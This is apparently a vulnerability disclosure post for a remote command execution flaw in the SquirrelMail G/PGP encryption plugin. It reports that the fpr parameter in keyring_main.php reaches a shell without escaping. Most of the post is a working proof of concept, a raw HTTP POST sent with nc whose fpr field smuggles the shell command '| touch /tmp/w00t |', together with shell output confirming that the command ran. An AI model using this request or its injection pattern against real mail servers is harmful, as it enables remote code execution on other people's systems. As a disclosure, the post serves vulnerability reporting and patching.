SquirrelMail G/PGP Encryption Plug-in Remote Command Execution Vulnerability

Bugtraq ID: 24782

-----------------------------

There are various vulnerabilities in this software! One is in
keyring_main.php!
$fpr is not escaped from shellcommands!

testbox:/home/w00t# cat /tmp/w00t
cat: /tmp/w00t: No such file or directory
testbox:/home/w00t#

***@silverlaptop:~$ nc *** 80
POST /webmail/plugins/gpg/modules/keyring_main.php HTTP/1.1
Host: ***
User-Agent: w00t
Keep-Alive: 300
Connection: keep-alive
Cookie: Authentication Data for SquirrelMail

id=C5B1611B8E71C***&fpr= | touch /tmp/w00t |
&pos=0&sort=email_name&desc=&srch=&ring=all&passphrase=&deletekey=true&deletepair=false&trust=1

...

testbox:/home/w00t# cat /tmp/w00t
testbox:/home/w00t#

So we just executed 'touch /tmp/w00t'!
